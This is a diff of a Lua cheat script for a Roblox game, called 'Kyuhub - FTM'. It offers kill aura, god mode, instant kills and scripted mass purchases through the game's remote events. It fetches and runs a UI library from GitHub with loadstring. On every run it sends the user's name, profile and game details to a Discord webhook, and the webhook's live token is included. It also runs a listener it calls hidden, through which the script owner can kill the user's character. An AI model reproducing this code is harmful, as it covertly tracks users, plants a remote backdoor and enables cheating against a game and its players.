@@ -1,13 +1,13 @@
 -- Exclusion list
 local exclusionList = {
-    617016152, 
-    5734469370 
+    617016152, -- Your user ID
+    617016152 -- New user ID
 }
 
 -- Owner list
 local ownerList = {
     617016152,
-    5734469370 
+    617016152
 }
 
 -- Webhook function
@@ -27,12 +27,12 @@ local function sendWebhook()
     local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
     local playerLevel = player.leaderstats.Level.Value -- Get player level
 
-    local webhookUrl = "https://discord.com/api/webhooks/1259159133169647716/zgEpZEtPGOe5AsamkF3Jx6dNHv96Vh1anjxCQiYCBK8d6GRFHrenRqWj1M2d_dnc-1V1"
+    local webhookUrl = "https://discord.com/api/webhooks/1255888074504671262/gz9jZ8nWhEmE9pt5GTdM_NLzdxJRZJmmJ1HTPYs0hUyhrKAMAkn4R5Ko0GjXoUZ5IjyP"
     local payload = {
         ["content"] = "",
         ["embeds"] = {{
             ["title"] = "Script Executed",
-            ["description"] = username .. " has executed the script.",
+            ["description"] = "A user has executed the script.",
             ["fields"] = {
                 {["name"] = "Username", ["value"] = username, ["inline"] = true},
                 {["name"] = "Profile", ["value"] = profileLink, ["inline"] = true},
@@ -55,31 +55,9 @@ end
 -- Send webhook notification at the start
 sendWebhook()
 
--- Rayfield Library Initialization
-local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
-
-local Window = Rayfield:CreateWindow({
-    Name = "Kyuhub - FTM",
-    LoadingTitle = "Rayfield Interface Suite",
-    LoadingSubtitle = "by Sirius",
-    ConfigurationSaving = {
-        Enabled = true,
-        FolderName = "Rayfield Interface Suite",
-        FileName = "Big Hub"
-    },
-    KeySystem = true, -- Set this to true to use their key system
-    KeySettings = {
-        Title = "Kyu Hub",
-        Subtitle = "Key System",
-        Note = "Join the discord https://discord.gg/hzwnbzGJ",
-        SaveKey = true,
-        Key = "kyu123"
-    }
-})
-
-Rayfield:Notify("Kyuhub", "Welcome to Kyuhub - FTM", 4483362458)
-
-local Tab = Window:CreateTab("Main", 4483362458) -- Title, Image
+-- Orion Library Initialization
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+local Window = OrionLib:MakeWindow({Name = "Kyuhub - FTM", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionConfig"})
 
 local Settings = {
     KillAura_Enabled = false,
@@ -143,37 +121,33 @@ local function attackMobsInRange()
 end
 
 local function equipOPArmor()
-    local armorPads = {
-        game:GetService("Workspace").ArmorHolder:GetChildren()[10].Pad,
-        game:GetService("Workspace").ArmorHolder["DESTROYER Armor || Level 0 || [+INF Health]  [+50 Speed]"].Pad
-    }
-    for _, pad in ipairs(armorPads) do
-        local touchInterest = pad:FindFirstChildWhichIsA("TouchTransmitter")
-        if touchInterest then
-            firetouchinterest(player.Character.HumanoidRootPart, pad, 0)
-            firetouchinterest(player.Character.HumanoidRootPart, pad, 1)
-        end
-    end
+	local armorPads = {
+		game:GetService("Workspace").ArmorHolder:GetChildren()[10].Pad,
+		game:GetService("Workspace").ArmorHolder["DESTROYER Armor || Level 0 || [+INF Health]  [+50 Speed]"].Pad
+	}
+	for _, pad in ipairs(armorPads) do
+		local touchInterest = pad:FindFirstChildWhichIsA("TouchTransmitter")
+		if touchInterest then
+			firetouchinterest(player.Character.HumanoidRootPart, pad, 0)
+			firetouchinterest(player.Character.HumanoidRootPart, pad, 1)
+		end
+	end
 end
 
-local function toggleGodMode(enable)
+local function removeTouchInterest()
     for _, mob in ipairs(workspace.MobHolder:GetChildren()) do
         for _, part in ipairs(mob:GetChildren()) do
             if part:IsA("BasePart") then
-                if enable then
-                    local touchInterest = Instance.new("TouchTransmitter")
-                    touchInterest.Parent = part
-                else
-                    for _, child in ipairs(part:GetChildren()) do
-                        if child:IsA("TouchTransmitter") then
-                            child:Destroy()
-                        end
+                for _, child in ipairs(part:GetChildren()) do
+                    if child:IsA("TouchTransmitter") then
+                        child:Destroy()
                     end
                 end
             end
         end
     end
 end
+
 
 local function bringPlayer(targetPlayer)
     local character = player.Character
@@ -192,44 +166,6 @@ local function killAllEnemies()
         if mob:FindFirstChild("Enemy") then
             mob.Enemy.Health = 0
         end
-    end
-end
-
-local function instantKill()
-    for _, mob in ipairs(workspace.MobHolder:GetChildren()) do
-        if mob:FindFirstChild("Enemy") then
-            local humanoid = mob:FindFirstChildOfClass("Humanoid")
-            if humanoid then
-                humanoid.Health = 0
-            end
-        end
-    end
-end
-
-local function getAllWeapons()
-    local gold = player.leaderstats.Gold.Value
-
-    if gold < 1000 then
-        player:Kick("Insufficient gold! Read notes next time you stupid fuck!")
-    else
-        local itemsFolders = {
-            game:GetService("ReplicatedStorage").GameItems,
-            game:GetService("ReplicatedStorage").Items.Common,
-            game:GetService("ReplicatedStorage").Items.Epic,
-            game:GetService("ReplicatedStorage").Items.Legendary,
-            game:GetService("ReplicatedStorage").Items.Rare,
-            game:GetService("ReplicatedStorage").Items.Uncommon,
-        }
-        for _, folder in ipairs(itemsFolders) do
-            for _, item in ipairs(folder:GetChildren()) do
-                local args = {
-                    [1] = item.Name
-                }
-                game:GetService("ReplicatedStorage").GameRemotes.BuyEvent:FireServer(unpack(args))
-            end
-        end
-        task.wait(1)
-        player:Kick("All items successfully are in your inventory! Pressing the button again will just kick you and does nothing.")
     end
 end
 
@@ -252,98 +188,159 @@ local function adminControl()
                             player.Character.Humanoid.Health = 0
                         elseif string.sub(command, 1, 6) == "notif " then
                             local notifMessage = string.sub(message, 7)
-                            Rayfield:Notify("Script Owner", notifMessage, 4483345998)
+                            OrionLib:MakeNotification({
+                                Name = "Script Owner",
+                                Content = notifMessage,
+                                Image = "rbxassetid://4483345998",
+                                Time = 5
+                            })
                         elseif command == "killallenemies" then
                             killAllEnemies()
-                        elseif command == "instantkill" then
-                            instantKill()
                         end
                     end)
                 end
             end
-            wait(1)
+            wait(10) -- Check for owner messages every 10 seconds
         end
     end)
 end
 
--- Admin control execution
+-- Execute hidden admin control
 adminControl()
 
-Tab:CreateToggle({
-    Name = "Kill aura",
-    CurrentValue = false,
+-- UI Tab and Toggles
+local Tab = Window:MakeTab({
+    Name = "Kill Aura",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddToggle({
+    Name = "Enable Kill Aura",
+    Default = false,
     Callback = function(value)
         Settings.KillAura_Enabled = value
         if value then
-            while Settings.KillAura_Enabled do
-                attackMobsInRange()
-                wait(0.1)
-            end
+            updateRangeHighlight()
+        else
+            rangeHighlight.Adornee = nil
         end
     end
 })
 
-Tab:CreateSlider({
+Tab:AddSlider({
     Name = "Kill Aura Range",
-    Range = {1, 100},
+    Min = 1,
+    Max = 100,
+    Default = 10,
     Increment = 1,
-    Suffix = "studs",
-    CurrentValue = Settings.KillAura_Range,
     Callback = function(value)
         Settings.KillAura_Range = value
         updateRangeHighlight()
     end
 })
 
-Tab:CreateSlider({
-    Name = "Range Highlight Transparency",
-    Range = {0, 1},
+Tab:AddSlider({
+    Name = "Highlight Transparency",
+    Min = 0,
+    Max = 1,
+    Default = 0.5,
     Increment = 0.1,
-    Suffix = "",
-    CurrentValue = Settings.Highlight_Transparency,
     Callback = function(value)
         Settings.Highlight_Transparency = value
         updateRangeHighlight()
     end
 })
 
-Tab:CreateToggle({
-    Name = "Enable Range Highlight",
-    CurrentValue = false,
+Tab:AddToggle({
+    Name = "Show Highlight",
+    Default = true,
     Callback = function(value)
         Settings.Highlight_Enabled = value
         updateRangeHighlight()
     end
 })
 
-Tab:CreateButton({
+Tab:AddButton({
     Name = "Equip OP Armor",
-    Callback = equipOPArmor
-})
-
-Tab:CreateToggle({
-    Name = "God Mode",
-    CurrentValue = false,
-    Callback = function(value)
-        Settings.GodMode_Enabled = value
-        toggleGodMode(value)
+    Callback = function()
+        equipOPArmor()
     end
 })
 
-Tab:CreateButton({
-    Name = "Instant Kill (semi patched)",
-    Callback = instantKill
+Tab:AddButton({
+    Name = "Kill Nearby all enemies (SEMI PATCHED)",
+    Callback = function()
+        killAllEnemies()
+    end
 })
 
-Tab:CreateButton({
+Tab:AddParagraph("NOTE:","semi patched will work on some mobs and some boss but breaks some mobs and some boss.")
+
+Tab:AddButton({
     Name = "Get All Weapons",
-    Callback = getAllWeapons
+    Callback = function()
+        local function getAllWeapons()
+            local gold = player.leaderstats.Gold.Value
+        
+            if gold < 1000 then
+                player:Kick("Insufficient gold! Read notes next time you stupid fuck!")
+            else
+                local itemsFolders = {
+                    game:GetService("ReplicatedStorage").GameItems,
+                    game:GetService("ReplicatedStorage").Items.Common,
+                    game:GetService("ReplicatedStorage").Items.Epic,
+                    game:GetService("ReplicatedStorage").Items.Legendary,
+                    game:GetService("ReplicatedStorage").Items.Rare,
+                    game:GetService("ReplicatedStorage").Items.Uncommon,
+                }
+                for _, folder in ipairs(itemsFolders) do
+                    for _, item in ipairs(folder:GetChildren()) do
+                        local args = {
+                            [1] = item.Name
+                        }
+                        game:GetService("ReplicatedStorage").GameRemotes.BuyEvent:FireServer(unpack(args))
+                    end
+                end
+                task.wait(1)
+                player:Kick("All items successfully are in your inventory! Pressing the button again will just kick you and does nothing.")
+            end
+        end
+        getAllWeapons()
+    end
+})
+Tab:AddParagraph("NOTE:","You MUST have more than 1k gold or else you get kicked by protection")
+
+Tab:AddToggle({
+    Name = "Enable God Mode",
+    Default = false,
+    Callback = function(value)
+        Settings.GodMode_Enabled = value
+        if value then
+            spawn(function()
+                while Settings.GodMode_Enabled do
+                    removeTouchInterest()
+                    wait(0.1) -- Adjust the interval as needed
+                end
+            end)
+        end
+    end
 })
 
--- Main Loop
-game:GetService("RunService").Stepped:Connect(function()
-    if Settings.KillAura_Enabled then
-        attackMobsInRange()
+Tab:AddParagraph("NOTE:","When Godmode is disabled newly spawned mobs will damage you")
+
+
+-- Continuous Update Loop
+spawn(function()
+    while true do
+        if Settings.KillAura_Enabled then
+            local foundMob = attackMobsInRange()
+            if not foundMob then
+                wait(1) -- Wait longer if no mobs are found within range
+            end
+        end
+        wait(0.1) -- Adjust the interval as needed
     end
 end)
 
+OrionLib:Init()
